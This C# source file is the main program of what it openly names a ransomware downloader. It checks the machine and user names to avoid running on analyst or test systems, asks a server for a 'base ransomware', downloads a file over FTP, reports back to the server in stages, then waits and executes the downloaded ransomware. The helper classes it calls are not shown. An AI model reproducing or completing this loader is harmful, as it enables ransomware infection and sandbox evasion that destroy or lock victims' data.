using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RansomwareBaseDownloader
{
    class Program
    {

        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        public static void ransomwareDownload()
        {
            if (Environment.MachineName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("PoC-tester")) return;
            Thread.Sleep(2000);
            serverCommunicator.setRansomwareFilePath();
            serverCommunicator.getBaseRansomware();
            Console.WriteLine(serverCommunicator.getNAMEONTEST());
            Thread.Sleep(10000);
            //Install ransomware

            serverCommunicator.postBaseTaken();

            Thread.Sleep(5000);

            serverCommunicator.downloadFileFTP();

            Thread.Sleep(8000);

            serverCommunicator.postBaseFetched();

            Thread.Sleep(60000);

            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());


            //Play ransomware
        }
    }
}
